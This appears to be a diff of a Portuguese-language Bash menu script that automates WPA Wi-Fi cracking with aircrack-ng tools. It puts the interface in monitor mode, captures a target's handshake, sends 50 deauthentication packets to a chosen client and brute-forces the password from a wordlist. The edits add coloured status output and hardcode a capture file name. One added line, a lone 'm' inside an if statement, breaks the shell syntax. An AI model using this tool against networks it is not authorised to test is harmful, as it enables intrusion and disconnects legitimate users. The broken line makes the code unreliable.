@@ -4,16 +4,17 @@
 # Data: 19/07/2016 versão 0.1-0
 # Autor: Joao Lucas <joaolucas@linuxmail.org>
 # Github: https://github.com/joao-lucas
+# Lincença GPLv3
 #
 
 INTERFACE=wlp2s0
 INTERFACE_MON=wlp2s0mon
 DATA=$(date +'%d-%m-%Y-%H-%M')
-ARQ_CAP=arq_$DATA.cap
-WORD_LIST=/home/joao_lucas/Área\ de\ Trabalho/Wordlists/wpa.list
+ARQ_CAP=arq_$DATA
+WORD_LIST="/home/joao_lucas/Desktop/Wordlists/wpa.list"
 
 menu(){
-	echo "##=================salvando em: $ARQ_CAP==================##"
+	echo "##=================salvando em: $ARQ_CAP-01.cap==================##"
 	echo "1. Ativar modo monitoramento" 
 	echo "2. Scannear redes encontradas"
 	echo "3. Injetar pacotes"
@@ -38,10 +39,11 @@ modo_monitoramento(){
 	airmon-ng start $INTERFACE
 	if [ $? -eq 0 ]
 	then
-		echo -e "\n [ OK ] Modo monitoramento ativo!"
+                echo -e "\n [\033[0;32m OK\033[0m ] Modo monitoramento ativo!"
 		menu
 	else
-		echo -e "\n [ FALHA ] Ocorreram erros em ativar modo monitoramento!"
+
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em ativar modo monitoramento!"
 		echo "~ Verifique se a interface de rede esta correta!"
 		menu
 	fi
@@ -60,12 +62,12 @@ scannear_redes(){
 	airodump-ng --bssid $BSSID --essid $ESSID --channel $CHANNEL --write $ARQ_CAP $INTERFACE_MON
 	if [ $? -eq 0 ]
 	then
-                echo -e "\n [ OK ] Captura de pacotes da rede $ESSID executado com sucesso!"
+                echo -e "\n [\033[0;32m OK\033[0m ] Captura de pacotes da rede $ESSID executado com sucesso!"
 	        echo "[ AVISO ] Anote o mac de pelo menos um cliente"	 
-                echo "~ Salvando em: $ARQ_CAP"
+                echo "~ Salvando em: $ARQ_CAP-01.cap"
 		menu	
 	else
-		echo "[ FALHA ] Ocorreram erros em capturar pacotes da rede $ESSID"
+                echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em capturar pacotes da rede $ESSID"
 		menu
 	fi
 }
@@ -77,10 +79,10 @@ deauth(){
 	#echo "~ Fazendo DEAUTH"	
 	if [ $? -eq 0 ]
 	then
-		echo "[ OK ] DEAUTH realizado com sucesso!"
+                echo -e "\n [\033[0;32m OK\033[0m ] DEAUTH realizado com sucesso!"
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros em fazer DEAUTH!"
+                echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em fazer DEAUTH!"
 		menu
 	fi
 }
@@ -90,18 +92,30 @@ injetar_pacotes(){
         read -p "> Informe o mac de um cliente: " client
         aireplay-ng -0 50 -a $BSSID -c $client $INTERFACE_MON
 	if [ $? -eq 0 ]
+                m
 	then
-		echo "[ OK ] Pacotes injetados!"
+                echo -e "\n [\033[0;32m OK\033[0m ] Pacotes injetados!"
 		menu
 	else
-		echo "[ FALHA ] Ocorreram erros em injetar pacotes!"
+		echo -e "\n [\033[0;31m FALHA\033[0m ] Ocorreram erros em injetar pacotes!"
 		menu
 	fi
 }
 
+# TENTAR QUEBRAR SENHA
 TENTAR_quebrar_senha(){
-	aircrack-ng $BSSID -w $WORD_LIST 
-	menu
+        #A senha da rede que você esta tentanto quebrar deve estar na sua wordlist"
+        sleep 3 
+        aircrack-ng -w $WORD_LIST arq_20-07-2016-14-14-01.cap
+        if [ $? -eq 0 ]
+        then
+               echo -e "\n [\033[0;32m OK\033[0m ] Senha quebrada com sucesso!"
+               sleep 3
+               menu
+       else
+               echo -e "\n [\033[0;31m FALHA\033[0m ] A senha não se encontra em sua Wordlist"
+               menu
+       fi 
 }
 
 while true
@@ -111,7 +125,7 @@ do
 		clear
 		menu
 	else
-		echo "Executar script como root!"
+		echo "~ Executar script como root!"
 		sleep 3
 		exit 0
 	fi
